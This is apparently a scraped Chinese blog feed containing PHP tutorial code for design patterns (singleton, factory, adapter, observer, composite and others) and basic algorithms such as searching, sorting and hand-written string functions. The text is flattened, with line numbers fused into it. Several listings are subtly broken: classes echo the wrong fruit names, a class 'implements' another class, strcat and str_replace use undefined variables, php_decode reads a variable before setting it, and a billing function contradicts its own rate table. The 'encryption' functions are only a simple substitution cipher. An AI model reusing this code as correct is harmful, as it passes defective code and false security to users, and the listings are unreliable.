&#123; public function __construct($string = 'my', $string2 = 'darling') &#123; echo "Goodbye $string $string2\n"; &#125;&#125;$a = Hello::getInstance('World'); $b = Hello::getInstance('bob'); // $a !== $b $c = Hello::getInstance('World'); // $a === $c $d = GoodBye::getInstance(); $e = GoodBye::getInstance();// $d === $e $f = GoodBye::getInstance('your'); // $d !== $f 简单工厂模式123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105interface fruit&#123; /** * 生长 */ public function grow(); /** * 种植 */ public function plant(); /** * 收获 */ public function harvest(); /** * 吃 */ public function eat();&#125;class apple implements fruit&#123; //苹果树有年龄 private $treeAge; //苹果有颜色 private $color; public function grow()&#123; echo "grape grow"; &#125; public function plant()&#123; echo "grape plant"; &#125; public function harvest()&#123; echo "grape harvest"; &#125; public function eat()&#123; echo "grape eat"; &#125; //取苹果树的年龄 public function getTreeAge()&#123; return $this-&gt;treeAge; &#125; //设置苹果树的年龄 public function setTreeAge($age)&#123; $this-&gt;treeAge = $age; return true; &#125;&#125;class grape implements fruit&#123; //葡萄是否有籽 private $seedLess; public function grow()&#123; echo "apple grow"; &#125; public function plant()&#123; echo "apple plant"; &#125; public function harvest()&#123; echo "apple harvest"; &#125; public function eat()&#123; echo "apple eat"; &#125; //有无籽取值 public function getSeedLess()&#123; return $this-&gt;seedLess; &#125; //设置有籽无籽 public function setSeedLess($seed)&#123; $this-&gt;seedLess = $seed; return true; &#125;&#125;class farmer&#123; //定义个静态工厂方法 public static function factory($fruitName)&#123; switch ($fruitName) &#123; case 'apple': return new apple(); break; case 'grape': return new grape(); break; default: throw new badFruitException("Error no the fruit", 1); break; &#125; &#125;&#125;class badFruitException extends Exception&#123; public $msg; public $errType; public function __construct($msg = '' , $errType = 1)&#123; $this-&gt;msg = $msg; $this-&gt;errType = $errType; &#125; &#125;/** * 获取水果实例化的方法 */try&#123; $appleInstance = farmer::factory('apple'); var_dump($appleInstance);&#125;catch(badFruitException $err)&#123; echo $err-&gt;msg . "_______" . $err-&gt;errType;&#125; 工厂模式12345678910111213141516171819202122232425262728293031323334工厂模式，工厂方法或者类生成对象，而不是在代码中直接 new。 \使用工厂模式，可以避免当改变某个类的名字或者方法之后，在调用这个类的所有的代码中都修改它的名字或者参数。 Test1.php &lt;?php class Test1&#123; static function test()&#123; echo __FILE__; &#125; &#125; Factory.php &lt;?php class Factory&#123; /* * 如果某个类在很多的文件中都new ClassName()，那么万一这个类的名字 * 发生变更或者参数发生变化，如果不使用工厂模式，就需要修改每一个PHP * 代码，使用了工厂模式之后，只需要修改工厂类或者方法就可以了。 */ static function createDatabase()&#123; $test = new Test1(); return $test; &#125; &#125;Test.php &lt;?php spl_autoload_register('autoload1'); $test = Factory::createDatabase(); $test-&gt;test();function autoload1($class)&#123; $dir = __DIR__; $requireFile = $dir."\\".$class.".php"; require $requireFile;&#125; 注册模式12345678910111213141516171819注册模式，解决全局共享和交换对象。已经创建好的对象，挂在到某个全局可以使用的数组上，在需要使用的时候，直接从该数组上获取即可。将对象注册到全局的树上。任何地方直接去访问。 &lt;?php class Register &#123; protected static $objects; function set($alias,$object)//将对象注册到全局的树上 &#123; self::$objects[$alias]=$object;//将对象放到树上 &#125; static function get($name)&#123; return self::$objects[$name];//获取某个注册到树上的对象 &#125; function _unset($alias) &#123; unset(self::$objects[$alias]);//移除某个注册到树上的对象。 &#125; &#125; 适配器模式12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788将各种截然不同的函数接口封装成统一的 API。 PHP 中的数据库操作有 MySQL,MySQLi,PDO 三种，可以用适配器模式统一成一致，使不同的数据库操作，统一成一样的 API。类似的场景还有 cache 适配器，可以将 memcache,redis,file,apc 等不同的缓存函数，统一成一致。 首先定义一个接口 (有几个方法，以及相应的参数)。然后，有几种不同的情况，就写几个类实现该接口。将完成相似功能的函数，统一成一致的方法。接口 IDatabase &lt;?php namespace IMooc; interface IDatabase &#123; function connect($host, $user, $passwd, $dbname); function query($sql); function close(); &#125;MySQL &lt;?php namespace IMooc\Database; use IMooc\IDatabase; class MySQL implements IDatabase &#123; protected $conn; function connect($host, $user, $passwd, $dbname) &#123; $conn = mysql_connect($host, $user, $passwd); mysql_select_db($dbname, $conn); $this-&gt;conn = $conn; &#125; function query($sql) &#123; $res = mysql_query($sql, $this-&gt;conn); return $res; &#125; function close() &#123; mysql_close($this-&gt;conn); &#125; &#125;MySQLi &lt;?php namespace IMooc\Database; use IMooc\IDatabase; class MySQLi implements IDatabase &#123; protected $conn; function connect($host, $user, $passwd, $dbname) &#123; $conn = mysqli_connect($host, $user, $passwd, $dbname); $this-&gt;conn = $conn; &#125; function query($sql) &#123; return mysqli_query($this-&gt;conn, $sql); &#125; function close() &#123; mysqli_close($this-&gt;conn); &#125; &#125;PDO &lt;?php namespace IMooc\Database; use IMooc\IDatabase; class PDO implements IDatabase &#123; protected $conn; function connect($host, $user, $passwd, $dbname) &#123; $conn = new \PDO("mysql:host=$host;dbname=$dbname", $user, $passwd); $this-&gt;conn = $conn; &#125; function query($sql) &#123; return $this-&gt;conn-&gt;query($sql); &#125; function close() &#123; unset($this-&gt;conn); &#125; &#125;通过以上案例，PHP 与 MySQL 的数据库交互有三套 API，在不同的场景下可能使用不同的 API，那么开发好的代码，换一个环境，可能就要改变它的数据库 API，那么就要改写所有的代码，使用适配器模式之后，就可以使用统一的 API 去屏蔽底层的 API 差异带来的环境改变之后需要改写代码的问题。 策略模式123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566策略模式，将一组特定的行为和算法封装成类，以适应某些特定的上下文环境。 \eg：假如有一个电商网站系统，针对男性女性用户要各自跳转到不同的商品类目，并且所有的广告位展示不同的广告。在传统的代码中，都是在系统中加入各种 if else 的判断，硬编码的方式。如果有一天增加了一种用户，就需要改写代码。使用策略模式，如果新增加一种用户类型，只需要增加一种策略就可以。其他所有的地方只需要使用不同的策略就可以。 \首先声明策略的接口文件，约定了策略的包含的行为。然后，定义各个具体的策略实现类。 UserStrategy.php &lt;?php /* * 声明策略文件的接口，约定策略包含的行为。 */ interface UserStrategy &#123; function showAd(); function showCategory(); &#125; FemaleUser.php &lt;?php require_once 'Loader.php'; class FemaleUser implements UserStrategy &#123; function showAd()&#123; echo "2016冬季女装"; &#125; function showCategory()&#123; echo "女装"; &#125; &#125; MaleUser.php &lt;?php require_once 'Loader.php'; class MaleUser implements UserStrategy &#123; function showAd()&#123; echo "IPhone6s"; &#125; function showCategory()&#123; echo "电子产品"; &#125; &#125; Page.php//执行文件 &lt;?php require_once 'Loader.php'; class Page &#123; protected $strategy; function index()&#123; echo "AD"; $this-&gt;strategy-&gt;showAd(); echo "&lt;br&gt;"; echo "Category"; $this-&gt;strategy-&gt;showCategory(); echo "&lt;br&gt;"; &#125; function setStrategy(UserStrategy $strategy)&#123; $this-&gt;strategy=$strategy; &#125; &#125; $page = new Page(); if(isset($_GET['male']))&#123; $strategy = new MaleUser(); &#125;else &#123; $strategy = new FemaleUser(); &#125; $page-&gt;setStrategy($strategy); $page-&gt;index(); 观察者模式123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051521：观察者模式 (Observer)，当一个对象状态发生变化时，依赖它的对象全部会收到通知，并自动更新。 \2：场景：一个事件发生后，要执行一连串更新操作。传统的编程方式，就是在事件的代码之后直接加入处理的逻辑。当更新的逻辑增多之后，代码会变得难以维护。这种方式是耦合的，侵入式的，增加新的逻辑需要修改事件的主体代码。 \3：观察者模式实现了低耦合，非侵入式的通知与更新机制。 定义一个事件触发抽象类。 EventGenerator.php &lt;?php require_once 'Loader.php'; abstract class EventGenerator&#123; private $observers = array(); function addObserver(Observer $observer)&#123; $this-&gt;observers[]=$observer; &#125; function notify()&#123; foreach ($this-&gt;observers as $observer)&#123; $observer-&gt;update(); &#125; &#125; &#125;定义一个观察者接口Observer.php&lt;?phprequire_once 'Loader.php';interface Observer&#123; function update();//这里就是在事件发生后要执行的逻辑&#125; &lt;?php //一个实现了EventGenerator抽象类的类，用于具体定义某个发生的事件 require 'Loader.php'; class Event extends EventGenerator&#123; function triger()&#123; echo "Event&lt;br&gt;"; &#125; &#125; class Observer1 implements Observer&#123; function update()&#123; echo "逻辑1&lt;br&gt;"; &#125; &#125; class Observer2 implements Observer&#123; function update()&#123; echo "逻辑2&lt;br&gt;"; &#125; &#125; $event = new Event(); $event-&gt;addObserver(new Observer1()); $event-&gt;addObserver(new Observer2()); $event-&gt;triger(); $event-&gt;notify();当某个事件发生后，需要执行的逻辑增多时，可以以松耦合的方式去增删逻辑。也就是代码中的红色部分，只需要定义一个实现了观察者接口的类，实现复杂的逻辑，然后在红色的部分加上一行代码即可。这样实现了低耦合 原型模式123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869原型模式（对象克隆以避免创建对象时的消耗） \1：与工厂模式类似，都是用来创建对象。 \2：与工厂模式的实现不同，原型模式是先创建好一个原型对象，然后通过 clone 原型对象来创建新的对象。这样就免去了类创建时重复的初始化操作。 \3：原型模式适用于大对象的创建，创建一个大对象需要很大的开销，如果每次 new 就会消耗很大，原型模式仅需要内存拷贝即可。Canvas.php&lt;?phprequire_once 'Loader.php';class Canvas&#123;private $data;function init($width = 20, $height = 10) &#123; $data = array(); for($i = 0; $i &lt; $height; $i++) &#123; for($j = 0; $j &lt; $width; $j++) &#123; $data[$i][$j] = '*'; &#125; &#125; $this-&gt;data = $data; &#125;function rect($x1, $y1, $x2, $y2) &#123; foreach($this-&gt;data as $k1 =&gt; $line) &#123; if ($x1 &gt; $k1 or $x2 &lt; $k1) continue; foreach($line as $k2 =&gt; $char) &#123; if ($y1&gt;$k2 or $y2&lt;$k2) continue; $this-&gt;data[$k1][$k2] = '#'; &#125; &#125; &#125; function draw()&#123; foreach ($this-&gt;data as $line)&#123; foreach ($line as $char)&#123; echo $char; &#125; echo "&lt;br&gt;;"; &#125; &#125;&#125; Index.php &lt;?php require 'Loader.php'; $c = new Canvas(); $c-&gt;init(); // $canvas1 = new Canvas(); // $canvas1-&gt;init(); $canvas1 = clone $c;//通过克隆，可以省去init()方法，这个方法循环两百次 //去产生一个数组。当项目中需要产生很多的这样的对象时，就会new很多的对象，那样 //是非常消耗性能的。 $canvas1-&gt;rect(2, 2, 8, 8); $canvas1-&gt;draw(); echo "-----------------------------------------&lt;br&gt;"; // $canvas2 = new Canvas(); // $canvas2-&gt;init(); $canvas2 = clone $c; $canvas2-&gt;rect(1, 4, 8, 8); $canvas2-&gt;draw();装饰器模式1：装饰器模式，可以动态的添加修改类的功能 \2：一个类提供了一项功能，如果要在修改并添加额外的功能，传统的编程模式，需要写一个子类继承它，并重写实现类的方法 \3：使用装饰器模式，仅需要在运行时添加一个装饰器对象即可实现，可以实现最大额灵活性。https://learnku.com/articles/34239 三大经典模式123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102class Single &#123; public function index() &#123; return ''; &#125;&#125;$single1 = new Single();$single2 = new Single();var_dump($single1);var_dump($single2);if ($single2 === $single1) &#123; echo "是同一个对象";&#125; else &#123; echo "不是同一个对象";&#125;// object(Single)#1 (0) &#123;// &#125;// object(Single)#2 (0) &#123;// &#125;// 不是同一个对象class Single2 &#123; // 1.声明一个静态属性，用户保存类的实例 public static $instance; //3. 将构函数私有化，避免外部new(每new一次，就不是同一个实例) private function __construct() &#123; &#125; // 2.声明一个静态的公共方法，用户外部调用本类的实例 public static function getInstance() &#123; if (!(self::$instance instanceof self)) &#123; self::$instance = new self; &#125; return self::$instance; &#125; //3. 克隆函数私有化，避免外部clone(每clone一次，就不是同一个实例) private function __clone() &#123; &#125;&#125;$singleDemo1 = Single2::getInstance();$singleDemo2 = Single2::getInstance();var_dump($singleDemo1-&gt;getInstance());var_dump($singleDemo2-&gt;getInstance());if ($singleDemo1 === $singleDemo2) &#123; echo "是同一个对象";&#125; else &#123; echo "不是同一个对象";&#125;// object(Single2)#3 (0) &#123;// &#125;// object(Single2)#3 (0) &#123;// &#125;// 是同一个对象/** * 工厂模式 */class Factory&#123; public static function createObj() &#123; return Single::getInstance('个人技术'); &#125;&#125;/** * 注册模式 * 含义:就是将对象放在一个对象池中，使用的时候直接去对象池查找. * 需要如下几个操作: * 1.注册 * 2.存放对象池 * 3.获取 * 4.销毁 */Class Register&#123; // 用一个数组来当做对象池，键当做对象别名，值存储具体对象 public static $objTree = []; // 将对象放在对象池 public static function set($key, $val) &#123; return self::$objTree[$key] = $val; &#125; // 通过对象别名在对象池中获取到对象别名 public static function get($key) &#123; return self::$objTree[$key]; &#125; // 通过对象别名将对象从对象池中注销 public static function _unset($key) &#123; unset(self::$objTree[$key]); &#125;&#125;Register::set('single', Factory::createObj());$single = Register::get('single');print_r($single);echo $single::$attribute;https://learnku.com/articles/36134 接口隔离123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354客户端不应当被迫实现它不需要用到的接口工作接口interface WorkableInterface&#123; public function work();&#125;睡觉接口interface SleepableInterface&#123; public function sleep();&#125;工人和机器根据自身情况去实现这些接口class HumanWorker implements WorkableInterface, SleepableInterface&#123; public function work() &#123; return 'human working.'; &#125; public function sleep() &#123; return 'human sleeping'; &#125;&#125;class AndroidWorker implements WorkableInterface&#123; public function work() &#123; return 'android working.'; &#125; public function beManaged() &#123; $this-&gt;work(); &#125;&#125;机长class Captain&#123; public function manage($worker) &#123; if($worker instanceof WorkableInterface)&#123; $worker-&gt;work(); &#125; else if($worker instanceof SleepableInterface)&#123; $worker-&gt;sleep(); &#125; &#125;&#125;https://learnku.com/articles/39202 开放封闭12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667对扩展开放，是指代码应当很容易添加新功能。对修改封闭，是指我们在添加新功能的时候尽量不会涉及到原有代码的改动。interface Shape &#123; public function area();&#125;class Square implements Shape &#123; public $width; public function __construct($width) &#123; $this-&gt;width = $width; &#125; public function area() &#123; return $this-&gt;width * $this-&gt;width; &#125;&#125;class Circle implements Square &#123; public $radios; public function __construct($radios) &#123; $this-&gt;radios = $radios; &#125; public function area() &#123; return $this-&gt;radios * $this-&gt;radios * pi(); &#125;&#125;AreaCalculator 不再依赖于具体的行为，不需要去考虑不同形状的面积如何计算，只只需依赖于抽象的接口class AreaCalculator&#123; public function calculate($shapes) &#123; foreach($shapes as $shape) &#123; $area[] = $shape-&gt;area(); &#125; return array_sum($area); &#125;&#125;将变化的「支付方式」抽象出来，隐藏于接口背后interface PaymentMethodInterface&#123; public function acceptPayment($receipt);&#125;不同的支付方式去实现该接口，例如现金支付class CashPaymentMethod implements PaymentMethodInterface&#123; public function acceptPayment($receipt) &#123; // 接受现金支付 &#125;&#125;结账类不需要依赖具体的支付方式，只需要依赖抽象的支付接口即可class Checkout&#123; public function begin(Receipt $receipt, PaymentMethodInterface $paymentMethod) &#123; $paymentMethod-&gt;acceptPayment($receipt); &#125;&#125;https://learnku.com/articles/39065 组合模式123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121/** * Class CentralSystem 中央官制抽象类，其子类必须实现抽象方法 */abstract class CentralSystem&#123; // 当前类名字 protected $name; // 构造函数，初始化$name public function __construct($name) &#123; $this-&gt;name = $name; &#125; // 获得类名字 public function getName() &#123; return $this-&gt;name; &#125; // 添加子节点 abstract public function add(CentralSystem $centralSystem); // 移除子节点 abstract public function remove(CentralSystem $centralSystem); // 循环当前节点的子节点 abstract public function show($deep);&#125;/** * Class Emperor 皇帝类，相当于树的根节点root */class Emperor extends CentralSystem&#123; // 存放其子节点 protected $office = []; /** * @param CentralSystem $centralSystem 添加子节点，将子节点放在数组 * @throws Exception */ public function add(CentralSystem $centralSystem) &#123; // 获取新节点的名字 $office_name = $centralSystem-&gt;getName(); if (in_array($office_name, $this-&gt;office)) &#123; throw new Exception($office_name . '节点已经存在'); &#125; else &#123; $this-&gt;office[$office_name] = $centralSystem; &#125; &#125; /** * @param CentralSystem $centralSystem 移除子节点，将子节点从数组中移除 * @throws Exception */ public function remove(CentralSystem $centralSystem) &#123; // 获取新节点的名字 $office_name = $centralSystem-&gt;getName(); if (in_array($office_name, $this-&gt;office)) &#123; unset($this-&gt;office[$office_name]); &#125; else &#123; throw new Exception($office_name . '节点不存在'); &#125; &#125; /** * @param int $deep 重复字符'-'的次数 */ public function show($deep = 0) &#123; echo str_repeat('-', $deep) . $this-&gt;name; echo "&lt;/br&gt;"; // 循环子节点的 节点数组$office foreach ($this-&gt;office as $item) &#123; $item-&gt;show($deep + 4); &#125; &#125;&#125;/** * Class CompositeTest 组合模式测试----唐朝三省六部制 * 结果： * 唐太宗 * ----门下省 * ----中书省 * ----尚书省 * --------吏部 * --------户部 * --------礼部 * --------兵部 * --------刑部 * --------工部 */class CompositeTest&#123; public function test() &#123; // 唐太宗相当于根节点root $emperor = new Emperor('唐太宗'); // 唐太宗下的三个子节点：门下省、尚书省、中书省 $emperor-&gt;add(new Province('门下省')); $emperor-&gt;add(new Province('中书省')); $shangshu = new Province('尚书省'); // 这里单独赋值是因为“尚书省”要另外添加子节点 $emperor-&gt;add($shangshu); // 尚书省添加六部 $shangshu-&gt;add(new Ministries('吏部')); $shangshu-&gt;add(new Ministries('户部')); $shangshu-&gt;add(new Ministries('礼部')); $shangshu-&gt;add(new Ministries('兵部')); $shangshu-&gt;add(new Ministries('刑部')); $shangshu-&gt;add(new Ministries('工部')); // 循环唐太宗的子节点数组，其子节点又有自己的子节点。 $emperor-&gt;show(); &#125;&#125;https://learnku.com/articles/39635 大话 PHP 设计模式 php设计模式 设计模式之三种工厂模式 通俗易懂的设计模式 PHP面向对象编程：面向对象概念、基本实践、高级实战、PHP面向对象特殊实践 PHP 设计模式全集 2018 PHP 设计模式基础 PHP经验总结 - 聊聊面向对象 Laravel 源码阅读指南 – PHP 类的反射和依赖注入 设计模式超级简单的解释]]></content>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[基本数据结构算法]]></title>
    <url>%2F2018%2F11%2F23%2F%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AE%97%E6%B3%95%2F</url>
    <content type="text"><![CDATA[本文来自laravel-china 二分查找（数组里查找某个元素）12345678910111213function bin_sch($array, $low, $high, $k)&#123; if ( $low &lt;= $high)&#123; $mid = intval(($low+$high)/2 ); if ($array[$mid] == $k)&#123; return $mid; &#125;elseif ( $k &lt; $array[$mid])&#123; return bin_sch($array, $low, $mid-1, $k); &#125;else&#123; return bin_sch($array, $mid+ 1, $high, $k); &#125; &#125; return -1; &#125; 顺序查找（数组里查找某个元素）12345678910111213function seq_sch($array, $n, $k)&#123; $array[$n] = $k; for($i=0; $i&lt;$n; $i++)&#123; if( $array[$i]==$k)&#123; break; &#125; &#125; if ($i&lt;$n)&#123; return $i; &#125;else&#123; return -1; &#125; &#125; 线性表的删除（数组中实现）123456789function delete_array_element($array , $i) &#123; $len = count($array); for ($j= $i; $j&lt;$len; $j ++)&#123; $array[$j] = $array [$j+1]; &#125; array_pop ($array); return $array ; &#125; 冒泡排序（数组排序）123456789101112131415function bubble_sort( $array) &#123; $count = count( $array); if ($count &lt;= 0 ) return false; for($i=0 ; $i&lt;$count; $i ++)&#123; for($j=$count-1 ; $j&gt;$i; $j--)&#123; if ($array[$j] &lt; $array [$j-1])&#123; $tmp = $array[$j]; $array[$j] = $array[ $j-1]; $array [$j-1] = $tmp; &#125; &#125; &#125; return $array; &#125; 快速排序（数组排序）123456789101112131415function quick_sort($array ) &#123; if (count($array) &lt;= 1) return $array; $key = $array [0]; $left_arr = array(); $right_arr = array(); for ($i= 1; $i&lt;count($array ); $i++)&#123; if ($array[ $i] &lt;= $key) $left_arr [] = $array[$i]; else $right_arr[] = $array[$i ]; &#125; $left_arr = quick_sort($left_arr ); $right_arr = quick_sort( $right_arr); return array_merge($left_arr , array($key), $right_arr); &#125; 字符串长度1234567891011121314function strlen ($str) &#123; if ($str == '' ) return 0; $count = 0; while (1)&#123; if ( $str[$count] != NULL)&#123; $count++; continue; &#125;else&#123; break; &#125; &#125; return $count; &#125; 截取子串123456789101112131415161718192021222324function substr($str, $start, $length=NULL) &#123; if ($str== '' || $start&gt;strlen($str )) return; if (($length!=NULL) &amp;&amp; ( $start&gt;0) &amp;&amp; ($length&gt; strlen($str)-$start)) return; if (( $length!=NULL) &amp;&amp; ($start&lt; 0) &amp;&amp; ($length&gt;strlen($str )+$start)) return; if ($length == NULL) $length = (strlen($str ) - $start); if ($start &lt; 0)&#123; for ($i=(strlen( $str)+$start); $i&lt;(strlen ($str)+$start+$length ); $i++) &#123; $substr .= $str[$i]; &#125; &#125; if ($length &gt; 0)&#123; for ($i= $start; $i&lt;($start+$length ); $i++) &#123; $substr .= $str[$i]; &#125; &#125; if ( $length &lt; 0)&#123; for ($i =$start; $i&lt;(strlen( $str)+$length); $i++) &#123; $substr .= $str[$i ]; &#125; &#125; return $substr; &#125; 字符串翻转12345678function strrev($str) &#123; if ($str == '') return 0 ; for ($i=(strlen($str)- 1); $i&gt;=0; $i --)&#123; $rev_str .= $str[$i ]; &#125; return $rev_str; &#125; 字符串比较12345678910111213function strcmp($s1, $s2) &#123; if (strlen($s1) &lt; strlen($s2)) return -1 ; if (strlen($s1) &gt; strlen( $s2)) return 1; for ($i =0; $i&lt;strlen($s1 ); $i++)&#123; if ($s1[ $i] == $s2[$i])&#123; continue; &#125;else&#123; return false; &#125; &#125; return 0; &#125; 查找字符串1234567891011function strstr($str, $substr) &#123; $m = strlen($str); $n = strlen($substr ); if ($m &lt; $n) return false ; for ($i=0; $i &lt;=($m-$n+1); $i ++)&#123; $sub = substr( $str, $i, $n); if ( strcmp($sub, $substr) == 0) return $i; &#125; return false ; &#125; 字符串替换12345678910111213function str_replace($substr , $newsubstr, $str) &#123; $m = strlen($str); $n = strlen($substr ); $x = strlen($newsubstr ); if (strchr($str, $substr ) == false) return false; for ( $i=0; $i&lt;=($m- $n+1); $i++)&#123; $i = strchr($str, $substr); $str = str_delete ($str, $i, $n); $str = str_insert($str, $i, $newstr); &#125; return $str ; &#125; 自实现字符串处理函数1234567891011function str_insert($str, $i , $substr) &#123; for($j=0 ; $j&lt;$i; $j ++)&#123; $startstr .= $str[$j ]; &#125; for ($j=$i; $j &lt;strlen($str); $j ++)&#123; $laststr .= $str[$j ]; &#125; $str = ($startstr . $substr . $laststr); return $str ; &#125; 删除一段字符串1234567891011function str_delete($str , $i, $j) &#123; for ( $c=0; $c&lt;$i; $c++)&#123; $startstr .= $str [$c]; &#125; for ($c=( $i+$j); $c&lt;strlen ($str); $c++)&#123; $laststr .= $str[$c]; &#125; $str = ($startstr . $laststr ); return $str; &#125; 复制字符串12345678function strcpy($s1, $s2 ) &#123; if (strlen($s1)==NULL || !isset( $s2)) return; for ($i=0 ; $i&lt;strlen($s1); $i++)&#123; $s2[] = $s1 [$i]; &#125; return $s2; &#125; 连接字符串123456789function strcat($s1 , $s2) &#123; if (!isset($s1) || !isset( $s2)) return; $newstr = $s1 ; for($i=0; $i &lt;count($s); $i ++)&#123; $newstr .= $st[$i ]; &#125; return $newsstr; &#125; 简单编码函数（与php_decode函数对应）123456789101112function php_encode($str) &#123; if ( $str=='' &amp;&amp; strlen( $str)&gt;128) return false; for( $i=0; $i&lt;strlen ($str); $i++)&#123; $c = ord($str[$i ]); if ($c&gt;31 &amp;&amp; $c &lt;107) $c += 20 ; if ($c&gt;106 &amp;&amp; $c &lt;127) $c -= 75 ; $word = chr($c ); $s .= $word; &#125; return $s; &#125; 简单解码函数（与php_encode函数对应）123456789101112function php_decode($str) &#123; if ( $str=='' &amp;&amp; strlen($str )&gt;128) return false; for( $i=0; $i&lt;strlen ($str); $i++)&#123; $c = ord($word); if ( $c&gt;106 &amp;&amp; $c&lt;127 ) $c = $c-20; if ($c&gt;31 &amp;&amp; $c&lt; 107) $c = $c+75 ; $word = chr( $c); $s .= $word ; &#125; return $s; &#125; 简单加密函数（与php_decrypt函数对应）123456789101112131415function php_encrypt($str) &#123; $encrypt_key = 'abcdefghijklmnopqrstuvwxyz1234567890'; $decrypt_key = 'ngzqtcobmuhelkpdawxfyivrsj2468021359'; if ( strlen($str) == 0) return false; for ($i=0; $i&lt;strlen($str); $i ++)&#123; for ($j=0; $j &lt;strlen($encrypt_key); $j ++)&#123; if ($str[$i] == $encrypt_key [$j])&#123; $enstr .= $decrypt_key[$j]; break; &#125; &#125; &#125; return $enstr; &#125; 简单解密函数（与php_encrypt函数对应）123456789101112131415function php_decrypt($str) &#123; $encrypt_key = 'abcdefghijklmnopqrstuvwxyz1234567890'; $decrypt_key = 'ngzqtcobmuhelkpdawxfyivrsj2468021359'; if ( strlen($str) == 0) return false; for ($i=0; $i&lt;strlen($str); $i ++)&#123; for ($j=0; $j &lt;strlen($decrypt_key); $j ++)&#123; if ($str[$i] == $decrypt_key [$j])&#123; $enstr .= $encrypt_key[$j]; break; &#125; &#125; &#125; return $enstr; &#125; 王者编程大赛之四 — 约瑟夫环123456789101112131415约瑟夫环递推实现：https://www.fanhaobai.com/2017/12/2017-ziroom-king-4.htmlfunction josephus($n, $e)&#123; $idx = 0; for ($i = 2; $i &lt;= $n; $i ++) &#123; $idx = ($idx + $e) % $i; &#125; return $idx;&#125;接收标准输入处理并输出结果：$input = str_replace(' ', '&amp;', $input);parse_str($input, $arr);echo josephus($arr['n'], $arr['e']), PHP_EOL; 阶梯式电费算法123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869举个栗子，深圳为了推进市民节约用电推出了这样一个用电收费政策，电量使用阶梯式递增的收费计算方式，简单而言、用电越多平均的每度电越贵。(假设用户的每电量为整数，小于1度电则应缴费为0元) 耗电范围(°) 电费计算(1元/°) 1&lt;=x&lt;=10 1 11&lt;=x&lt;=20 1.2 21&lt;=x&lt;=50 1.4 51&lt;=x&lt;=100 1.8 101&lt;=x&lt;=300 2.4 301&lt;=x 5 /** * 根据用电的度数计算电费 * @param int $number 用电度数 * @return float 电费https://learnku.com/articles/24977 */function calculate(int $number): float&#123; if ($number &lt;= 0) &#123; return 0; &#125; switch ($number) &#123; case 1 &lt;= $number &amp;&amp; $number &lt;= 10: return $number * 1; break; case 11 &lt;= $number &amp;&amp; $number &lt;= 20: return ($number - 10) * 1.2 + calculate(10); break; case 21 &lt;= $number &amp;&amp; $number &lt;= 50: return ($number - 20) * 1.4 + calculate(20); break; case 51 &lt;= $number &amp;&amp; $number &lt;= 100: return ($number - 50) * 1.8 + calculate(50); break; case 101 &lt;= $number &amp;&amp; $number &lt;= 300: return ($number - 100) * 2.2 + calculate(100); break; default: return ($number - 300) * 5 + calculate(300); break; &#125;&#125;function calculate(int $useNum): float&#123; if ($useNum &lt; 1) &#123; return 0; &#125; // 电费价格及其范围的配置定义 | 此梯度可抽出来独立配置 $degrees = [10, 20, 50, 100, 300]; $prices = [1, 1.2, 1.4, 1.8, 2.4, 5]; // 判断是否达到最贵的价格梯度并计算其价格 $beyondNum = $useNum - end($degrees); $price = ($beyondNum &gt;= 0 ? $beyondNum : 0) * end($prices); // 上一层价格峰值 $prePeak = 0; foreach ($degrees as $key =&gt; $value) &#123; if ($useNum &lt;= $value) &#123; $price += ($useNum - $prePeak) * $prices[$key]; break; &#125; $price += ($value - $prePeak) * $prices[$key]; $prePeak = $value; &#125; unset($degrees, $prices, $beyondNum, $prePeak); return $price;&#125; 按照奖品概率分布抽奖123456789101112131415161718192021222324252627282930313233//所有奖品信息$allPrizes = [ 'jd' =&gt; ['name' =&gt; '京东券', 'probability' =&gt; 30], 'film' =&gt; ['name' =&gt; '电影票', 'probability' =&gt; 10], 'tb' =&gt; ['name' =&gt; '淘宝券', 'probability' =&gt; 60],]/** * 按照概率抽取一个奖品, 返回奖品 * @param array $prizes 所有奖品的probability概率总和应该为100 * @return mixed */private function randPrize(array $prizes)&#123; //总概率基数 $totalProbability = array_sum(array_column(array_values($prizes), 'probability')); if (100 !== $totalProbability) &#123; throw new Exception('invalid probability config'); &#125; $rand = mt_rand(1, 100); $cursor = 0; $id = ''; while(list($key, $item) = each($prizes)) &#123; if ($rand &gt; $cursor &amp;&amp; $rand &lt;= $cursor + $item['probability']) &#123; $id = $key; break; &#125; $cursor += $item['probability']; &#125; unset($prizes[$id]['probability']); return $prizes[$id] + ['id' =&gt; $id];&#125;https://www.fanhaobai.com/2017/05/draw-by-prob.html 非负元素数组所有元素能组合的最大字符串12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970[0, 9, 523, 94, 10, 4]，排列组合后值最大数为：9945234100。/** * 比较规则 * @param string $a * @param string $b * @return int */function cmp($a, $b) &#123; if ($a == $b) &#123; return 0; &#125; return $a . $b &gt; $b . $a ? -1 : 1;&#125;/** * 冒泡排序 * @param array $Arr 待排序数组 * @return array */function bubble_sort(array $Arr) &#123; $length = count($Arr); if ($length &lt; 2) &#123; return $Arr; &#125; for ($i = 1, $change = true; $i &lt;= $length &amp;&amp; $change; $i++) &#123; $change = false; for ($j = $length - 1; $j &gt; $i - 1; $j--) &#123; if (cmp($Arr[$j - 1], $Arr[$j]) &gt; 0) &#123; $temp = $Arr[$j - 1]; $Arr[$j - 1] = $Arr[$j]; $Arr[$j] = $temp; $change = true; &#125; &#125; &#125; return $Arr;&#125;/** * 寻找非零元素数组中所有元素排列组合后的最大值 * @param array $Arr 待排序数组 * @param string $method 排序方法 * @return mixed */function array_form_max_str(array $Arr, $method = 'bubble') &#123; //参数校验 